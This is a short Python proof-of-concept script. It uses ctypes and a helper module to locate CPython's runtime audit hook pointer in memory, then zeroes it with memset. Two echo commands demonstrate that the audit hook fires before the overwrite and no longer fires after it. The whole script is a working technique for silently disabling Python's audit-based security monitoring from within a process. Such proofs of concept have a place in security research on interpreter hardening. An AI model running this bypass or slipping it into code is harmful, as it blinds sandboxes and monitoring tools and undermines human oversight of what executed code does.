#!audit_hook_head_finder

### POC-native.py
### Find the offset to memset the audit hook set by C api
### and show to procession

from audit_hook_head_finder import print_all, get_runtime_audit_hook_ptr_addr, add_audit
import ctypes, os

add_audit()

print_all()
# must be stored in a variable
obj = ctypes.byref(ctypes.py_object(()))
ptr_tp = ctypes.POINTER(ctypes.c_uint64)
# somewhere in stack
obj_addr = ctypes.cast(obj, ptr_tp).contents.value
# we also can use the line below without creating a temporary `obj` variable
assert ctypes.POINTER(ctypes.c_voidp)(ctypes.py_object(())).contents.value == obj_addr
# offset to get audit hook pointer address (which has a "fixed" offset)
audit_hook_ptr_offset = get_runtime_audit_hook_ptr_addr() - obj_addr
print(f"audit_hook_ptr_offset={hex(audit_hook_ptr_offset)}")
# get audit hook
audit_hook = ctypes.cast(get_runtime_audit_hook_ptr_addr(), ptr_tp)

# - POC - 

os.system("echo 'test audit hook -- this will trigger hook'")

ctypes.memset(audit_hook, 0, 8)

os.system("echo 'test audit hook -- this will not'")